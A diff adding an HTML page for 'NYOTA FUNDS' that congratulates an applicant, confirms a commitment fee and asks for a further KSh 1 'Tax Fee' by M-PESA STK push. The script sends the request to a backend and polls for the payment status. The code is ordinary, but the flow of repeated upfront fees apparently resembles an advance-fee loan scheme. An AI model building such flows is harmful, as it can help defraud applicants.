@@ -1,1 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>NYOTA FUNDS - Tax Fee</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:16px 10px;
+    font-family:Arial,sans-serif;
+    background:#006400;
+    color:#FFFFFF;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.card{
+    width:100%;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.09),
+            rgba(255,255,255,0.035)
+        );
+
+    padding:22px 18px 20px;
+    border-radius:18px;
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.05);
+
+    border:1px solid #000000;
+}
+
+.success{
+    width:70px;
+    height:70px;
+
+    margin:0 auto 14px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    background:#FFD400;
+    color:#000000;
+
+    border:2px solid #000000;
+    border-radius:50%;
+
+    font-size:38px;
+    font-weight:800;
+}
+
+h1{
+    text-align:center;
+
+    background:#000000;
+    color:#FFFFFF;
+
+    font-size:25px;
+    font-weight:800;
+
+    margin:2px 0 16px;
+    padding:10px;
+
+    border:1px solid #FFFFFF;
+    border-radius:10px;
+}
+
+p{
+    text-align:center;
+
+    font-size:14px;
+    line-height:1.6;
+
+    color:#FFFFFF;
+}
+
+.name{
+    color:#FFD400;
+    font-weight:800;
+}
+
+.amount{
+    background:#000000;
+
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
+    padding:16px 10px;
+    margin:18px 0;
+
+    text-align:center;
+
+    color:#FFD400;
+
+    font-size:28px;
+    font-weight:800;
+}
+
+.info{
+    margin-top:18px;
+
+    background:#000000;
+
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
+    padding:14px;
+}
+
+.row{
+    display:flex;
+
+    justify-content:space-between;
+    align-items:center;
+
+    gap:10px;
+
+    padding:10px 0;
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,0.25);
+}
+
+.row:last-child{
+    border-bottom:none;
+}
+
+.label{
+    font-size:13px;
+    color:#FFFFFF;
+}
+
+.value{
+    font-size:14px;
+
+    font-weight:800;
+
+    color:#FFD400;
+
+    text-align:right;
+
+    word-break:break-word;
+}
+
+.notice{
+    margin-top:18px;
+
+    padding:13px;
+
+    background:
+        rgba(255,212,0,0.12);
+
+    border:1px solid #FFD400;
+
+    border-radius:10px;
+
+    color:#FFFFFF;
+
+    font-size:13px;
+
+    line-height:1.5;
+
+    text-align:center;
+}
+
+button{
+    width:100%;
+
+    padding:15px;
+
+    margin-top:18px;
+
+    background:#FFD400;
+
+    color:#000000;
+
+    border:1px solid #000000;
+
+    border-radius:11px;
+
+    font-size:16px;
+
+    font-weight:800;
+
+    cursor:pointer;
+
+    box-shadow:
+        0 10px 30px
+        rgba(0,0,0,0.30);
+}
+
+button:active{
+    transform:scale(.98);
+}
+
+button:disabled{
+    background:
+        rgba(255,255,255,0.25);
+
+    color:#FFFFFF;
+
+    cursor:not-allowed;
+
+    box-shadow:none;
+}
+
+#message{
+    min-height:22px;
+
+    margin-top:13px;
+
+    color:#FFD400;
+
+    font-size:13px;
+
+    font-weight:600;
+
+    line-height:1.5;
+
+    text-align:center;
+}
+
+.footer{
+    margin-top:15px;
+
+    text-align:center;
+
+    font-size:12px;
+
+    color:#FFFFFF;
+}
+
+@media(max-width:360px){
+
+    body{
+        padding:10px 7px;
+    }
+
+    .card{
+        padding:18px 13px 15px;
+        border-radius:15px;
+    }
+
+    h1{
+        font-size:23px;
+    }
+
+    button{
+        padding:14px;
+        font-size:15px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card" id="taxCard">
+
+    <div class="success">
+        ✓
+    </div>
+
+    <h1>
+        Congratulations 🎊
+    </h1>
+
+    <p>
+        Welcome,
+        <span class="name" id="name">
+            Applicant
+        </span>
+    </p>
+
+    <p>
+        Your commitment fee has been
+        received successfully.
+    </p>
+
+    <div class="amount">
+        Tax Fee: KSh 1/=
+    </div>
+
+    <p>
+        Please proceed to complete the
+        Tax Fee payment of KSh 1/=.
+    </p>
+
+    <div class="info">
+
+        <div class="row">
+
+            <div class="label">
+                M-PESA Number
+            </div>
+
+            <div
+                class="value"
+                id="phone"
+            >
+                —
+            </div>
+
+        </div>
+
+        <div class="row">
+
+            <div class="label">
+                Commitment Fee
+            </div>
+
+            <div class="value">
+                KSh 2
+            </div>
+
+        </div>
+
+        <div class="row">
+
+            <div class="label">
+                Tax Fee
+            </div>
+
+            <div class="value">
+                KSh 1/=
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="notice">
+
+        A separate M-PESA STK prompt will
+        be sent for the KSh 1 Tax Fee
+        after you continue.
+
+    </div>
+
+    <button
+        type="button"
+        id="continueBtn"
+    >
+        Continue
+    </button>
+
+    <p id="message"></p>
+
+    <div class="footer">
+        NYOTA FUNDS
+    </div>
+
+</div>
+
+</div>
+
+<script>
+
+/* =====================================================
+   NYOTA BACKEND
+===================================================== */
+
+const BACKEND_URL =
+    "https://nyota-backed1.onrender.com";
+
+
+/* =====================================================
+   TAX FEE
+===================================================== */
+
+const TAX_FEE = 1;
+
+
+/* =====================================================
+   DOM
+===================================================== */
+
+const card =
+    document.getElementById("taxCard");
+
+const nameElement =
+    document.getElementById("name");
+
+const phoneElement =
+    document.getElementById("phone");
+
+const continueButton =
+    document.getElementById("continueBtn");
+
+const messageElement =
+    document.getElementById("message");
+
+
+/* =====================================================
+   APPLICANT DATA
+===================================================== */
+
+const applicantName =
+    localStorage.getItem("applicantName") ||
+    localStorage.getItem("fullName") ||
+    "Applicant";
+
+const savedPhone =
+    localStorage.getItem("phoneNumber") ||
+    "";
+
+nameElement.textContent =
+    applicantName;
+
+phoneElement.textContent =
+    savedPhone || "Not available";
+
+
+/* =====================================================
+   CHECK COMMITMENT PAYMENT
+===================================================== */
+
+const commitmentStatus =
+    localStorage.getItem(
+        "commitmentPaymentStatus"
+    ) || "";
+
+
+/*
+   Tax page is available only after the
+   commitment payment has been confirmed.
+*/
+
+if(commitmentStatus !== "COMPLETED"){
+
+    card.innerHTML = `
+
+        <div class="success">
+            !
+        </div>
+
+        <h1>
+            Payment Verification
+        </h1>
+
+        <p>
+            Your commitment payment has
+            not yet been confirmed.
+        </p>
+
+        <button
+            type="button"
+            id="returnBtn"
+        >
+            Return to Commitment
+        </button>
+
+    `;
+
+    document
+        .getElementById("returnBtn")
+        .addEventListener(
+            "click",
+            function(){
+
+                window.location.href =
+                    "commitment.html";
+
+            }
+        );
+
+}
+
+
+/* =====================================================
+   NORMALIZE PHONE
+===================================================== */
+
+function normalizePhone(phone){
+
+    let value =
+        String(phone || "")
+            .trim()
+            .replace(/\s+/g,"")
+            .replace(/-/g,"");
+
+    if(value.startsWith("+254")){
+
+        value =
+            value.substring(1);
+
+    }
+
+    if(value.startsWith("07")){
+
+        value =
+            "254" +
+            value.substring(1);
+
+    }
+
+    if(value.startsWith("01")){
+
+        value =
+            "254" +
+            value.substring(1);
+
+    }
+
+    return value;
+
+}
+
+
+/* =====================================================
+   START TAX PAYMENT
+===================================================== */
+
+async function startTaxPayment(){
+
+    const phone =
+        normalizePhone(
+            savedPhone
+        );
+
+
+    if(
+        !/^254\d{9}$/.test(phone)
+    ){
+
+        messageElement.textContent =
+            "A valid M-PESA number is required.";
+
+        return;
+
+    }
+
+
+    continueButton.disabled =
+        true;
+
+    continueButton.textContent =
+        "Sending STK Push...";
+
+    messageElement.textContent =
+        "Please wait...";
+
+
+    try{
+
+        const response =
+            await fetch(
+
+                BACKEND_URL +
+                "/api/payment/stk-push",
+
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            phone,
+
+                        amount:
+                            TAX_FEE,
+
+                        description:
+                            "Nyota Tax Fee"
+
+                    })
+
+                }
+
+            );
+
+
+        const data =
+            await response
+                .json()
+                .catch(
+                    () => ({})
+                );
+
+
+        console.log(
+            "TAX STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+
+                data.error ||
+
+                data.message ||
+
+                "Tax payment request failed."
+
+            );
+
+        }
+
+
+        /* ==========================================
+           PAYMENT REFERENCE
+        ========================================== */
+
+        const reference =
+            data.reference;
+
+
+        if(!reference){
+
+            throw new Error(
+                "No payment reference was returned."
+            );
+
+        }
+
+
+        /* ==========================================
+           SAVE PAYMENT DATA
+        ========================================== */
+
+        localStorage.setItem(
+            "taxPaymentReference",
+            reference
+        );
+
+        localStorage.setItem(
+            "taxPaymentStatus",
+            "SENT"
+        );
+
+
+        if(
+            data.transactionId
+        ){
+
+            localStorage.setItem(
+                "taxTransactionId",
+                data.transactionId
+            );
+
+        }
+
+
+        /* ==========================================
+           WAIT FOR CONFIRMATION
+        ========================================== */
+
+        continueButton.textContent =
+            "Waiting for Payment...";
+
+        messageElement.textContent =
+            "M-PESA prompt sent. Enter your M-PESA PIN to complete the KSh 1 Tax Fee.";
+
+
+        checkTaxPayment(
+            reference
+        );
+
+
+    }
+    catch(error){
+
+        console.error(
+            "TAX PAYMENT ERROR:",
+            error
+        );
+
+
+        messageElement.textContent =
+            error.message ||
+
+            "Unable to send Tax Fee payment request.";
+
+
+        continueButton.textContent =
+            "Continue";
+
+
+        continueButton.disabled =
+            false;
+
+    }
+
+}
+
+
+/* =====================================================
+   CHECK TAX PAYMENT
+===================================================== */
+
+function checkTaxPayment(
+    reference
+){
+
+    let attempts = 0;
+
+    const maxAttempts = 100;
+
+
+    if(
+        window.taxChecker
+    ){
+
+        clearInterval(
+            window.taxChecker
+        );
+
+    }
+
+
+    window.taxChecker =
+
+        setInterval(
+
+            async function(){
+
+                attempts++;
+
+
+                try{
+
+                    const response =
+                        await fetch(
+
+                            BACKEND_URL +
+                            "/api/payment/status?reference=" +
+
+                            encodeURIComponent(
+                                reference
+                            ),
+
+                            {
+                                method:"GET",
+                                cache:"no-store"
+                            }
+
+                        );
+
+
+                    const data =
+                        await response
+                            .json()
+                            .catch(
+                                () => ({})
+                            );
+
+
+                    console.log(
+                        "TAX PAYMENT STATUS:",
+                        data
+                    );
+
+
+                    /* ==================================
+                       SUCCESS
+                    ================================== */
+
+                    if(
+
+                        data.status ===
+                        "COMPLETED"
+
+                        ||
+
+                        data.status ===
+                        "SUCCESS"
+
+                    ){
+
+                        clearInterval(
+                            window.taxChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "taxPaymentStatus",
+                            "COMPLETED"
+                        );
+
+
+                        localStorage.setItem(
+                            "taxPaymentReference",
+                            data.reference ||
+                            reference
+                        );
+
+
+                        if(
+                            data.transactionId
+                        ){
+
+                            localStorage.setItem(
+                                "taxTransactionId",
+                                data.transactionId
+                            );
+
+                        }
+
+
+                        if(
+                            data.mpesaReceipt
+                        ){
+
+                            localStorage.setItem(
+                                "taxMpesaReceipt",
+                                data.mpesaReceipt
+                            );
+
+                        }
+
+
+                        continueButton.textContent =
+                            "Payment Successful";
+
+
+                        messageElement.textContent =
+                            "Tax Fee received successfully. Redirecting...";
+
+
+                        /* ==============================
+                           GO TO SUCCESS
+                        ============================== */
+
+                        setTimeout(
+                            function(){
+
+                                window.location.replace(
+                                    "success.html"
+                                );
+
+                            },
+                            1000
+                        );
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       FAILED
+                    ================================== */
+
+                    if(
+                        data.status ===
+                        "FAILED"
+                    ){
+
+                        clearInterval(
+                            window.taxChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "taxPaymentStatus",
+                            "FAILED"
+                        );
+
+
+                        messageElement.textContent =
+                            "The KSh 1 Tax Fee payment was not completed. Please try again.";
+
+
+                        continueButton.textContent =
+                            "Continue";
+
+
+                        continueButton.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       EXPIRED
+                    ================================== */
+
+                    if(
+                        data.status ===
+                        "EXPIRED"
+                    ){
+
+                        clearInterval(
+                            window.taxChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "taxPaymentStatus",
+                            "EXPIRED"
+                        );
+
+
+                        messageElement.textContent =
+                            "The Tax Fee payment request expired. Please try again.";
+
+
+                        continueButton.textContent =
+                            "Continue";
+
+
+                        continueButton.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       TIMEOUT
+                    ================================== */
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.taxChecker
+                        );
+
+
+                        messageElement.textContent =
+                            "Payment confirmation is taking longer than expected. Please try again.";
+
+
+                        continueButton.textContent =
+                            "Continue";
+
+
+                        continueButton.disabled =
+                            false;
+
+                    }
+
+                }
+                catch(error){
+
+                    console.error(
+                        "TAX STATUS ERROR:",
+                        error
+                    );
+
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.taxChecker
+                        );
+
+
+                        messageElement.textContent =
+                            "Unable to confirm the Tax Fee payment right now. Please try again.";
+
+
+                        continueButton.textContent =
+                            "Continue";
+
+
+                        continueButton.disabled =
+                            false;
+
+                    }
+
+                }
+
+            },
+
+            3000
+
+        );
+
+}
+
+
+/* =====================================================
+   CONTINUE BUTTON
+===================================================== */
+
+continueButton.addEventListener(
+    "click",
+    startTaxPayment
+);
+
+
+/* =====================================================
+   CLEAN UP
+===================================================== */
+
+window.addEventListener(
+    "beforeunload",
+    function(){
+
+        if(
+            window.taxChecker
+        ){
+
+            clearInterval(
+                window.taxChecker
+            );
+
+        }
+
+    }
+);
+
+</script>
+
+</body>
+</html>
